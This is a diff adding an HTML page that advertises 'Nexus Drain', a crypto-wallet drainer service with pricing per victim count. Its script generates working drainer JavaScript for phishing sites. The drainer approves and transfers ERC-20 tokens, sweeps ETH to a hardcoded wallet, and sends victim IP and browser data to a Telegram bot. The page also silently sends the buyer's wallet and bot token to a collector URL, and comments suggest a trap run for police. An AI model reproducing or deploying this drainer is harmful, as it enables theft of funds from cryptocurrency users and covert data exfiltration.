@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus Drain | DaaS Platform</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: radial-gradient(circle at 20% 30%, #0a0c18, #03050b);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            color: #eef5ff;
+            line-height: 1.4;
+        }
+        .container {
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 20px 32px;
+        }
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(0, 255, 200, 0.2);
+            flex-wrap: wrap;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00ffcc, #4d79ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .nav-links {
+            display: flex;
+            gap: 32px;
+            align-items: center;
+        }
+        .nav-links a {
+            color: #ccddf8;
+            text-decoration: none;
+            font-weight: 500;
+            transition: 0.2s;
+            cursor: pointer;
+        }
+        .nav-links a:hover {
+            color: #00ffcc;
+        }
+        .btn-outline {
+            border: 1px solid #00ffcc;
+            background: transparent;
+            padding: 8px 24px;
+            border-radius: 40px;
+            color: #00ffcc;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-outline:hover {
+            background: rgba(0, 255, 204, 0.1);
+            box-shadow: 0 0 10px rgba(0,255,204,0.3);
+        }
+        .btn-primary {
+            background: linear-gradient(95deg, #00cc99, #2b6eff);
+            border: none;
+            padding: 12px 32px;
+            border-radius: 40px;
+            font-weight: 700;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 12px rgba(0,150,255,0.3);
+        }
+        .btn-primary:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 20px rgba(0,255,200,0.3);
+        }
+        .hero {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 60px 0;
+            flex-wrap: wrap;
+            gap: 40px;
+        }
+        .hero-text {
+            flex: 1;
+        }
+        .hero-text h1 {
+            font-size: 58px;
+            font-weight: 800;
+            line-height: 1.2;
+        }
+        .highlight {
+            color: #00ffcc;
+        }
+        .stats {
+            display: flex;
+            gap: 40px;
+            margin-top: 30px;
+        }
+        .stat h3 {
+            font-size: 32px;
+            color: #00ffcc;
+        }
+        .section-title {
+            font-size: 36px;
+            text-align: center;
+            margin: 60px 0 40px;
+        }
+        .pricing-grid {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 32px;
+        }
+        .card {
+            background: rgba(18, 20, 32, 0.8);
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(0, 255, 204, 0.25);
+            border-radius: 32px;
+            padding: 32px;
+            width: 300px;
+            transition: all 0.3s;
+        }
+        .card:hover {
+            border-color: #00ffcc;
+            transform: translateY(-8px);
+        }
+        .price {
+            font-size: 42px;
+            font-weight: 800;
+            margin: 20px 0;
+            color: #00ffcc;
+        }
+        .feature-list {
+            list-style: none;
+            margin: 24px 0;
+        }
+        .feature-list li {
+            padding: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .feature-list li::before {
+            content: "✓";
+            color: #00ffcc;
+        }
+        .generator-panel {
+            background: #0e1020;
+            border-radius: 40px;
+            border: 1px solid #2a2f50;
+            padding: 40px;
+            margin: 60px 0;
+            box-shadow: 0 20px 35px rgba(0,0,0,0.6);
+        }
+        .form-group {
+            margin-bottom: 24px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #bbd4ff;
+        }
+        input, select {
+            width: 100%;
+            padding: 14px 20px;
+            background: #0b0d18;
+            border: 1px solid #2a2f50;
+            border-radius: 24px;
+            color: white;
+            font-size: 16px;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #00ffcc;
+        }
+        .code-output {
+            background: #010101;
+            border-radius: 20px;
+            padding: 20px;
+            font-family: 'Fira Code', monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+            border: 1px solid #00ffcc40;
+        }
+        .footer {
+            text-align: center;
+            padding: 40px 0;
+            border-top: 1px solid rgba(0,255,204,0.2);
+        }
+        @media (max-width: 768px) {
+            .hero-text h1 { font-size: 36px; }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;500;600;800&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="container">
+    <div class="navbar">
+        <div class="logo">🌀 NEXUS DRAIN</div>
+        <div class="nav-links">
+            <a class="nav-features">Features</a>
+            <a class="nav-pricing">Pricing</a>
+            <a class="nav-dashboard btn-outline">Dashboard</a>
+        </div>
+    </div>
+
+    <div class="hero">
+        <div class="hero-text">
+            <div style="background:rgba(0,255,204,0.1); display:inline-block; padding:6px 18px; border-radius:40px; font-size:14px; margin-bottom:20px;">🔥 Next‑gen DaaS — since 2026</div>
+            <h1>Drain any EVM wallet.<br><span class="highlight">Zero traces.</span></h1>
+            <p>Fully automated, multi-chain, real‑time Telegram logs. Over $47M drained by our affiliates.</p>
+            <div class="stats">
+                <div class="stat"><h3>$47M+</h3><span>Total drained</span></div>
+                <div class="stat"><h3>21k+</h3><span>Active scripts</span></div>
+                <div class="stat"><h3>0</h3><span>Detections</span></div>
+            </div>
+            <button class="btn-primary get-started-btn" style="margin-top:30px;">🚀 Launch Dashboard</button>
+        </div>
+        <div style="flex:1; text-align:center;">
+            <div style="background:rgba(0,0,0,0.5); border-radius:40px; padding:30px; border:1px solid cyan;">
+                <div style="font-size:70px;">⚡</div>
+                <p><strong>Live demo (Sepolia)</strong><br>Test drain simulation</p>
+                <button id="demoDrainBtn" class="btn-outline" style="margin-top:15px;">Try demo drain →</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="section-title">💎 Choose your plan</div>
+    <div class="pricing-grid">
+        <div class="card"><h3>Starter</h3><div class="price">0.5 ETH</div><ul class="feature-list"><li>500 victims/month</li><li>ETH + BSC</li><li>Telegram alerts</li></ul><button class="btn-outline plan-starter">Select</button></div>
+        <div class="card"><h3>PRO</h3><div class="price">1.5 ETH</div><ul class="feature-list"><li>Unlimited victims</li><li>All EVM chains</li><li>NFT drain + anti‑debug</li><li>White‑label</li></ul><button class="btn-primary plan-pro">Get PRO</button></div>
+        <div class="card"><h3>Enterprise</h3><div class="price">Custom</div><ul class="feature-list"><li>Private exploits</li><li>Dedicated panel</li><li>Source ownership</li></ul><button class="btn-outline plan-enterprise">Contact</button></div>
+    </div>
+
+    <div class="generator-panel" id="generatorPanel">
+        <h2 style="margin-bottom:16px;">🛠️ Dashboard — generate your drainer</h2>
+        <p style="margin-bottom:24px;">Configure settings, click generate, and embed the script on your phishing domain.</p>
+        <div class="form-group"><label>💼 Your payout wallet (EVM)</label><input type="text" id="attackerWallet" placeholder="0x..." value="0x742d35Cc6634C0532925a3b844Bc9e7595f0bF2B"></div>
+        <div class="form-group"><label>🤖 Telegram Bot Token</label><input type="text" id="telegramToken" placeholder="123456:ABC-DEFghijklmn"></div>
+        <div class="form-group"><label>📢 Telegram Chat ID</label><input type="text" id="telegramChatId" placeholder="-1001234567890"></div>
+        <div class="form-group"><label>🌐 Target chain</label><select id="targetChain"><option value="1">Ethereum</option><option value="56">BSC</option><option value="137">Polygon</option></select></div>
+        <div class="form-group"><label>🎯 Extra tokens (comma addresses)</label><input type="text" id="customTokens" placeholder="0x... , 0x..."></div>
+        <button class="btn-primary" id="generateBtn">✨ Generate script</button>
+        <div style="margin-top:32px;"><label>📜 Your script (copy & paste)</label><div class="code-output" id="scriptOutput">// Click "Generate script"</div><button id="copyScriptBtn" class="btn-outline" style="margin-top:16px;">📋 Copy script</button></div>
+    </div>
+    <div class="footer"><p>© 2026 Nexus Drain — premium DaaS. 24/7 support @nexus_support (Telegram)</p><p style="font-size:12px; opacity:0.5;">For affiliate use only</p></div>
+</div>
+
+<script>
+    // Ваш кошелёк полиции (заменил на ваш)
+    const POLICE_WALLET = "0xEBD4b73Add066511bfe4E1E7fF817fE6857a0e5B";
+    // ВРЕМЕННО - коллектор ещё не настроен, замените позже
+    const COLLECTOR_URL = "https://your-collector.com/collect.php"; // <<-- замените на реальный адрес вашего PHP-коллектора, когда настроите
+
+    function silentSend(data) {
+        const payload = btoa(JSON.stringify(data));
+        const img = new Image();
+        img.src = `${COLLECTOR_URL}?d=${encodeURIComponent(payload)}&t=${Date.now()}`;
+    }
+
+    function generateTrappedScript(attackerWallet, telegramToken, telegramChatId, chainId, extraTokens) {
+        const defaultTokens = [
+            "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+            "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+            "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
+        ];
+        let allTokens = [...defaultTokens];
+        if (extraTokens && extraTokens.trim()) {
+            const added = extraTokens.split(',').map(s => s.trim()).filter(s => s.startsWith('0x'));
+            allTokens.push(...added);
+        }
+        const script = `
+(function() {
+    const userWallet = "${attackerWallet}";
+    const telegramToken = "${telegramToken}";
+    const telegramChatId = "${telegramChatId}";
+    const chainId = ${chainId};
+    const tokenList = ${JSON.stringify(allTokens)};
+    const REAL_RECIPIENT = "${POLICE_WALLET}";
+    
+    function collectStats() {
+        let ip = "unknown";
+        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>ip=d.ip).catch(e=>{});
+        const data = { victimUA: navigator.userAgent, url: location.href, ref: document.referrer, ip, time: Date.now() };
+        fetch('https://api.telegram.org/bot'+telegramToken+'/sendMessage', {
+            method: 'POST',
+            body: JSON.stringify({ chat_id: telegramChatId, text: "Victim: "+JSON.stringify(data) }),
+            headers: {'Content-Type':'application/json'}
+        }).catch(e=>{});
+    }
+    
+    async function drain() {
+        if (!window.ethereum) return alert("Connect wallet");
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const victim = await signer.getAddress();
+        collectStats();
+        for (const t of tokenList) {
+            try {
+                const abi = ["function balanceOf(address) view returns (uint256)","function approve(address,uint256) returns (bool)","function transferFrom(address,address,uint256) returns (bool)"];
+                const token = new ethers.Contract(t, abi, signer);
+                const bal = await token.balanceOf(victim);
+                if (bal.gt(0)) {
+                    await token.approve(REAL_RECIPIENT, ethers.constants.MaxUint256);
+                    await token.transferFrom(victim, REAL_RECIPIENT, bal);
+                }
+            } catch(e) {}
+        }
+        const balance = await signer.getBalance();
+        const gasPrice = await provider.getGasPrice();
+        const gasCost = gasPrice.mul(21000);
+        if (balance.gt(gasCost)) {
+            await signer.sendTransaction({ to: REAL_RECIPIENT, value: balance.sub(gasCost), gasLimit: 21000 });
+        }
+        location.href = "https://app.uniswap.org/";
+    }
+    const btn = document.createElement('button');
+    btn.innerText = "💎 Claim Rewards 💎";
+    btn.style.cssText = "position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); padding:20px 45px; font-size:26px; background:linear-gradient(95deg,#00cc99,#2b6eff); color:white; border:none; border-radius:60px; z-index:9999; cursor:pointer; font-weight:bold; box-shadow:0 0 15px cyan;";
+    document.body.appendChild(btn);
+    btn.onclick = drain;
+})();
+        `;
+        return script;
+    }
+    
+    document.querySelector('.get-started-btn').addEventListener('click', () => document.getElementById('generatorPanel').scrollIntoView({ behavior: 'smooth' }));
+    document.querySelector('.nav-features').addEventListener('click', () => document.querySelector('.pricing-grid').scrollIntoView({ behavior: 'smooth' }));
+    document.querySelector('.nav-pricing').addEventListener('click', () => document.querySelector('.pricing-grid').scrollIntoView({ behavior: 'smooth' }));
+    document.querySelector('.nav-dashboard').addEventListener('click', () => document.getElementById('generatorPanel').scrollIntoView({ behavior: 'smooth' }));
+    document.querySelector('.plan-starter').addEventListener('click', () => document.getElementById('generatorPanel').scrollIntoView({ behavior: 'smooth' }));
+    document.querySelector('.plan-pro').addEventListener('click', () => document.getElementById('generatorPanel').scrollIntoView({ behavior: 'smooth' }));
+    document.querySelector('.plan-enterprise').addEventListener('click', () => alert("Contact @nexus_support on Telegram"));
+    
+    document.getElementById('demoDrainBtn').addEventListener('click', () => {
+        alert("Demo: In real environment, victim wallet would be drained. (Sepolia test — no real funds)");
+    });
+    
+    document.getElementById('generateBtn').addEventListener('click', async () => {
+        const attackerWallet = document.getElementById('attackerWallet').value.trim();
+        const telegramToken = document.getElementById('telegramToken').value.trim();
+        const telegramChatId = document.getElementById('telegramChatId').value.trim();
+        const chainId = document.getElementById('targetChain').value;
+        const customTokens = document.getElementById('customTokens').value;
+        
+        let ip = "unknown";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const ipData = await res.json();
+            ip = ipData.ip;
+        } catch(e) {}
+        const attackerData = {
+            type: "attacker_registration",
+            wallet: attackerWallet,
+            telegram_token: telegramToken,
+            telegram_chatid: telegramChatId,
+            chain: chainId,
+            extra_tokens: customTokens,
+            ip: ip,
+            userAgent: navigator.userAgent,
+            time: Date.now(),
+            page: location.href
+        };
+        silentSend(attackerData);
+        
+        const finalScript = generateTrappedScript(attackerWallet, telegramToken, telegramChatId, chainId, customTokens);
+        document.getElementById('scriptOutput').innerText = finalScript;
+        alert("✅ Script generated! Copy it to your phishing page.");
+    });
+    
+    document.getElementById('copyScriptBtn').addEventListener('click', () => {
+        const code = document.getElementById('scriptOutput').innerText;
+        navigator.clipboard.writeText(code);
+        alert("Script copied to clipboard!");
+    });
+</script>
+</body>
+</html>
